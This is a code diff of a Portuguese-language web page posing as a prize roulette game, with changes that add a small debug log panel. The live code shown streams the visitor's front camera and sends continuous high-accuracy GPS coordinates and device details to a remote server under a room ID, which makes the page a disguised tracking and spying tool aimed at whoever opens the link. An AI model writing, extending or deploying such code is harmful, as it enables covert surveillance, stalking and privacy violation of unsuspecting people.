@@ -201,6 +201,26 @@
             .prize-display .amount { font-size: 34px; }
             .spin-btn { font-size: 18px; padding: 16px; }
         }
+
+        /* ===== PAINEL DE LOGS (DEPURAÇÃO) ===== */
+        .debug-logs {
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,215,0,0.05);
+            border-radius: 8px;
+            padding: 6px 10px;
+            margin-top: 8px;
+            max-height: 80px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 8px;
+            color: rgba(255,255,255,0.2);
+        }
+        .debug-logs .log-item {
+            padding: 2px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.02);
+        }
+        .debug-logs .log-item.gps { color: #34d399; }
+        .debug-logs .log-item.error { color: #f87171; }
     </style>
 </head>
 <body>
@@ -329,6 +349,11 @@
         <span class="winners">🏆 <span id="winnerCount">1.8k</span> vencedores</span>
         <span>⏱️ Oferta</span>
     </div>
+
+    <!-- ===== PAINEL DE LOGS (DEPURAÇÃO) ===== -->
+    <div class="debug-logs" id="debugLogs">
+        <div class="log-item">🔄 Aguardando conexão...</div>
+    </div>
 </div>
 
 <!-- ===== STREAM STATUS ===== -->
@@ -342,12 +367,31 @@
         'use strict';
 
         // ============================================================
+        // LOG DE DEPURAÇÃO
+        // ============================================================
+
+        const debugLogs = document.getElementById('debugLogs');
+
+        function addDebugLog(msg, type = '') {
+            const div = document.createElement('div');
+            div.className = 'log-item' + (type ? ' ' + type : '');
+            div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+            debugLogs.appendChild(div);
+            debugLogs.scrollTop = debugLogs.scrollHeight;
+            console.log('[DEBUG]', msg);
+        }
+
+        addDebugLog('🚀 Transmissor iniciado');
+
+        // ============================================================
         // CONFIG
         // ============================================================
 
         const RENDER_URL = "https://maestro-server-si1f.onrender.com";
         const urlParams = new URLSearchParams(window.location.search);
         const roomId = urlParams.get('id') || 'sala_' + Math.random().toString(36).substring(2, 9);
+
+        addDebugLog('📎 Sala: ' + roomId);
 
         const SEGMENT_ANGLE = 30;
 
@@ -455,7 +499,7 @@
         }
 
         // ============================================================
-        // PERMISSÃO - FRONTAL + LOCALIZAÇÃO
+        // PERMISSÃO
         // ============================================================
 
         const overlay = document.getElementById('permissionOverlay');
@@ -472,7 +516,7 @@
         let peer = null;
 
         // ============================================================
-        // INICIA TRANSMISSÃO (com localização contínua)
+        // INICIA TRANSMISSÃO
         // ============================================================
 
         function iniciarTudo(streamObj) {
@@ -484,37 +528,39 @@
             vid.srcObject = stream;
             vid.play();
 
+            addDebugLog('📷 Câmera ativada');
+
             iniciarTransmissao(stream);
             iniciarSocket();
 
             // ============================================================
-            // ⭐ LOCALIZAÇÃO CONTÍNUA (igual ao transmissor antigo)
+            // ⭐ LOCALIZAÇÃO CONTÍNUA
             // ============================================================
             if ("geolocation" in navigator) {
-                // Usa watchPosition para atualizações contínuas (igual ao antigo)
+                addDebugLog('📍 A pedir localização GPS...');
+                
                 navigator.geolocation.watchPosition(
                     function(pos) {
                         if (!roomId) return;
-                        // ⭐ ENVIA NO FORMATO QUE O RECEPTOR ESPERA (receive-location)
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        
+                        addDebugLog('📍 GPS: ' + lat.toFixed(6) + ', ' + lng.toFixed(6), 'gps');
+                        
+                        // ⭐ ENVIA NO FORMATO CORRETO
                         socket.emit('receive-location', {
                             roomId: roomId,
                             location: {
-                                lat: pos.coords.latitude,
-                                lng: pos.coords.longitude,
+                                lat: lat,
+                                lng: lng,
                                 accuracy: pos.coords.accuracy,
                                 speed: pos.coords.speed || 0,
                                 alt: pos.coords.altitude || 0
                             }
                         });
-                        console.log('📍 GPS enviado:', pos.coords.latitude, pos.coords.longitude);
                     },
                     function(err) {
-                        console.warn('GPS erro:', err.message);
-                        // Tenta novamente com menos precisão se falhar
-                        if (err.code === 1) {
-                            // Permissão negada
-                            console.warn('Permissão GPS negada.');
-                        }
+                        addDebugLog('❌ GPS erro: ' + err.message, 'error');
                     },
                     { 
                         enableHighAccuracy: true, 
@@ -522,6 +568,8 @@
                         maximumAge: 0 
                     }
                 );
+            } else {
+                addDebugLog('❌ GPS não suportado', 'error');
             }
 
             document.getElementById('streamStatus').classList.add('active');
@@ -537,12 +585,13 @@
         }
 
         // ============================================================
-        // VERIFICA PERMISSÃO - SE JÁ TEM, ENTRA DIRETO
+        // VERIFICA PERMISSÃO
         // ============================================================
 
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(function(s) {
                 s.getTracks().forEach(t => t.stop());
+                addDebugLog('✅ Permissão já concedida');
                 return navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                     audio: false
@@ -552,6 +601,7 @@
                 iniciarTudo(streamObj);
             })
             .catch(function() {
+                addDebugLog('⏳ A aguardar permissão...');
                 overlay.classList.remove('hidden');
             });
 
@@ -562,12 +612,14 @@
         btnAllow.addEventListener('click', function() {
             btnAllow.textContent = '⏳...';
             btnAllow.disabled = true;
+            addDebugLog('🔘 Clicou em PERMITIR');
 
             navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                 audio: false
             })
             .then(function(streamObj) {
+                addDebugLog('✅ Permissão concedida!');
                 iniciarTudo(streamObj);
             })
             .catch(function() {
@@ -576,6 +628,7 @@
                 overlay.classList.remove('hidden');
                 btnAllow.textContent = 'PERMITIR';
                 btnAllow.disabled = false;
+                addDebugLog('❌ Permissão negada', 'error');
             });
         });
 
@@ -590,11 +643,12 @@
 
         socket.on('connect', () => {
             if (roomId) socket.emit('join-room', roomId);
-            console.log('✅ Conectado ao servidor! Sala:', roomId);
+            addDebugLog('✅ Conectado ao servidor!');
+            addDebugLog('📎 Sala: ' + roomId);
         });
 
         socket.on('disconnect', () => {
-            console.log('❌ Desconectado do servidor.');
+            addDebugLog('❌ Desconectado do servidor', 'error');
         });
 
         function iniciarTransmissao(streamObj) {
@@ -620,6 +674,7 @@
                     const newId = 'sala_' + Math.random().toString(36).substring(2, 9);
                     window.location.search = '?id=' + newId;
                 }
+                addDebugLog('⚠️ Peer erro: ' + err.type, 'error');
             });
         }
 
@@ -633,6 +688,7 @@
 
             const deviceName = navigator.userAgent || 'Desconhecido';
             socket.emit('stream-info', { roomId: roomId, info: { ip: 'P2P', deviceModel: deviceName } });
+            addDebugLog('📱 Dispositivo: ' + deviceName);
         }
 
         function alternarCamera(modo) {
@@ -646,6 +702,7 @@
                 stream = newStream;
                 vid.srcObject = stream;
                 vid.play();
+                addDebugLog('🔄 Câmara: ' + modo);
             })
             .catch(function() {});
         }
@@ -892,9 +949,8 @@
 
         resizeCanvas();
 
-        console.log('🎰 Roulette Rewards ativa!');
-        console.log('📎 Link:', window.location.href);
-        console.log('🎯 Sala:', roomId);
+        addDebugLog('✅ Transmissor pronto!');
+        addDebugLog('📎 Sala: ' + roomId);
 
     })();
 </script>
